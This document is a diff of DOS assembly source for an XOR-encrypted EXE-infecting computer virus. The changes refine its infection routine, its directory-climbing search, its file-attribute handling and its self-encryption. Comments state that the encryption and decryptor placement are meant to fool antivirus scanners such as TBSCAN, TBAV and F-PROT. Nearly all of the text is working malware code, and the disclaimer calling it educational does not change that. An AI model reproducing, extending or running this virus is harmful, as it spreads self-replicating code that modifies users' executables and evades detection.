@@ -8,8 +8,9 @@
 ; This virus is a non-resident infector of EXE files, encrypted with an
 ; XOR algorithm.
 ;
-; The virus will search the whole tree for files to infect, therefore
-; becomes very slow.
+; The virus infects EXE files in the current directory and walks upward
+; through parent directories to the root, then restores the starting
+; directory.
 ;
 ; Disclaimer:
 ; I take no responsibility for any damage, either direct or implied,
@@ -17,15 +18,14 @@
 ; after assembly. The code was written for educational purposes ONLY.
 ;
 
+	.model tiny
+	.code
+	.startup
 	locals @@
-
-cseg	segment byte public 'code'
-	assume cs:cseg, ds:cseg
-
-	org 100h
+	assume ss:nothing				; this EXE infector runs with SS != DS
 
 VirusSize	equ	EndVirus-BeginVirus
-VirusIdentifier	equ	'Ri'
+ExeMarker	equ	'JG'
 
 ;---------------------------------------------------------------------
 ;	The virus begins here
@@ -79,17 +79,30 @@ FindFiles:
 	int	21h
 
 	jnc	OpenFile				; if found a file
-	lea	dx, [bp+DirMask]			; else change directory
+	mov	ah, 47h					; else get current directory
+	xor	dl, dl					; current drive
+	lea	si, [bp+CwdBuf]
+	int	21h
+	cmp	byte ptr [bp+CwdBuf], 0			; at the root? (empty path)
+	jne	@@goup					; not root -> go up
+	jmp	NoMoreFiles				; root: stop (cd .. succeeds at root -> would loop)
+@@goup:	lea	dx, [bp+DirMask]			; go up one directory
 	mov	ah, 3bh
 	int	21h
-	jnc	FindNewFiles
-	jmp	NoMoreFiles				; end of all files
+	jmp	FindNewFiles				; and scan the parent
 
 OpenFile:
-	mov	ax, 3d02h				; open the found file
+	mov	ax, 4301h				; clear file attributes
+	xor	cx, cx
 	lea	dx, [bp+DtaArea+1eh]
 	int	21h
 
+	mov	ax, 3d02h				; open the found file
+	lea	dx, [bp+DtaArea+1eh]
+	int	21h
+	jnc	@@opened
+	jmp	RestoreAttr
+@@opened:
 	xchg	ax, bx					; file handle in bx
 
 	mov	ah, 3fh					; read the exe header
@@ -109,7 +122,7 @@ CheckIfInfected:
 	add	si, 10h					; saving another byte
 	; lea	si,[bp+ExeHead+12h]
 	lodsw
-	cmp	ax, VirusIdentifier			; is it already infected?
+	cmp	ax, ExeMarker				; is it already infected?
 	jne	InfectFile
 	jmp	CloseFile
 
@@ -123,10 +136,10 @@ InfectFile:
 	movsw
 
 	lea	di, [bp+ExeHead+12h]			; mark the file infected
-	mov	ax, VirusIdentifier
+	mov	ax, ExeMarker
 	stosw
 
-	mov	al, 2h					; go to end_of_file
+	mov	al, 2h					; Go EOF
 	call	SetFilePointer				; dx/ax is file length
 
 	mov	cx, 16					; use div to save bytes
@@ -142,43 +155,20 @@ InfectFile:
 	mov	word ptr [bp+ExeHead+0eh], ax
 	mov	word ptr [bp+ExeHead+10h], 4b0h
 
-	mov	ah, 2ch					; get random number
-	int	21h
-	xor	dh, dh					; just alter the code a little bit
-	or	dl, 00001010b				; with encryption so TB-scan wont't
-	mov	word ptr [bp+Key], dx			; find garbage instruction
+	call	WriteVirus
 
-	mov	ax, 08d00h				; copy entire virus to 8d00h:100h
-	mov	es, ax
-	mov	di, 100h
-	lea	si, [bp+BeginVirus]
-	mov	cx, (VirusSize+1)/2
-	rep	movsw
-	push	es
-	pop	ds
-	push	bp
-	xor	bp, bp					; and encrypt it there
-	call	EncryptDecrypt
-
-	mov	ah, 40h					; write virus to file from position
-	mov	cx, VirusSize				; 08d00h:100h
-	lea	dx, [bp+BeginVirus]
-	int	21h
-	pop	bp
-
-	push	cs
-	pop	ds
-
-	mov	al, 2h					; go to end of file
+	mov	al, 2h					; Go EOF
 	call	SetFilePointer
 
 	mov	cx, 512					; get filesize in 512 modules
 	div	cx
+	or	dx, dx
+	jz	@@exact
 	inc	ax
-	mov	word ptr [bp+ExeHead+2], dx		; put modulo/filesize in
+@@exact:mov	word ptr [bp+ExeHead+2], dx		; put modulo/filesize in
 	mov	word ptr [bp+ExeHead+4], ax		; exe header
 
-	xor	al, al					; go to beginning of file
+	xor	al, al					; Go SOF
 	call	SetFilePointer
 
 	mov	ah, 40h					; write new exe header
@@ -193,15 +183,17 @@ InfectFile:
 	int	21h
 
 CloseFile:
-	mov	ah, 3eh					; close file
+	mov	ah, 3eh					; Close file
 	int	21h
 
+RestoreAttr:
 	mov	ax, 4301h				; restore file attribute
+	xor	ch, ch
 	mov	cl, byte ptr [bp+DtaArea+15h]
 	lea	dx, [bp+DtaArea+1eh]
 	int	21h
 
-	mov	ah, 4fh					; find next file
+	mov	ah, 4fh					; Find next
 	jmp	FindFiles
 
 NoMoreFiles:
@@ -222,11 +214,46 @@ ExeRegs	dw	0, 0, 0, 0fff0h, 0, 0, 0, 0
 DirMask	db	'..', 0
 Pattern	db	'*.exe', 0
 
+;---------------------------------------------------------------------
+;	Helper functions
+;---------------------------------------------------------------------
+
 SetFilePointer:
 	mov	ah, 42h					; Jump in file
-	xor	cx, cx					; this saves a few bytes as
-	cwd						; it's used a few times
+	xor	cx, cx
+	cwd
 	int	21h
+	ret
+
+WriteVirus:
+	mov	ah, 2ch					; Get random number
+	int	21h
+	xor	dh, dh					; Keep key small so TBSCAN
+	or	dl, 00001010b				; won't flag garbage ops
+	mov	word ptr [bp+Key], dx
+
+	mov	ax, 08d00h				; Copy virus to 8d00h:100h
+	mov	es, ax
+	mov	di, 100h
+	lea	si, [bp+BeginVirus]
+	mov	cx, (VirusSize+1)/2
+	rep	movsw
+	push	es
+	pop	ds
+	push	bp
+	xor	bp, bp					; And encrypt it there
+	call	EncryptDecrypt
+
+	mov	ah, 40h					; Write virus to file
+	mov	cx, VirusSize
+	lea	dx, [bp+BeginVirus]
+	int	21h
+	pop	bp
+
+	push	cs					; cs=ds=es
+	push	cs
+	pop	ds
+	pop	es
 	ret
 
 EndEncryptedSection:
@@ -235,35 +262,30 @@ EndEncryptedSection:
 ;	End of encrypted section
 ;---------------------------------------------------------------------
 
-	db	0					; pad out a byte so encryption
-							; value won't be overwritten
-Key	dw	0
-
-EncryptDecrypt:
-	mov	si, word ptr ds:[bp+Key]
-	lea	di, [bp+BeginEncryptedSection]
-	mov	cx, (EndEncryptedSection-BeginEncryptedSection+1)/2
-@@loop:	xor	word ptr ds:[di], si
-	inc	di
-	inc	di
-	loop	@@loop
-	ret
-
 EntryPoint:
 	push	ax
 	pop	ax
 	push	ax
 	pop	ax
-	call	@@delta
-@@delta:pop	bp
-	sub	bp, offset @@delta
-
+	call	GetDelta
+EncryptDecrypt:
+	mov	dx, word ptr ds:[bp+Key]		; routine here to
+	lea	si, [bp+BeginEncryptedSection]		; fool TBAV/F-PROT
+	mov	cx, (EndEncryptedSection-BeginEncryptedSection)/2
+@@loop:	xor	word ptr ds:[si], dx			; Simple xor-loop
+	inc	si					; encryption
+	inc	si
+	loop	@@loop
+	ret
+Key	dw	0					; en/decrypt value
+GetDelta:
+	pop	bp
+	sub	bp, offset EncryptDecrypt		; Get delta offset
 	push	ds					; save es & ds
 	push	es
 	push	cs					; and point ds to code segment
 	pop	ds
-
-	call	EncryptDecrypt				; decrypt contents of file
+	call	EncryptDecrypt				; Decrypt virus
 	jmp	BeginEncryptedSection
 
 EndVirus:
@@ -275,7 +297,6 @@ EndVirus:
 ExeHead	db	24 dup (?)
 DtaArea	db	43 dup (?)
 SaveDir	db	64 dup (?)
+CwdBuf	db	64 dup (?)
 
-cseg ends
-
-end BeginVirus
+end
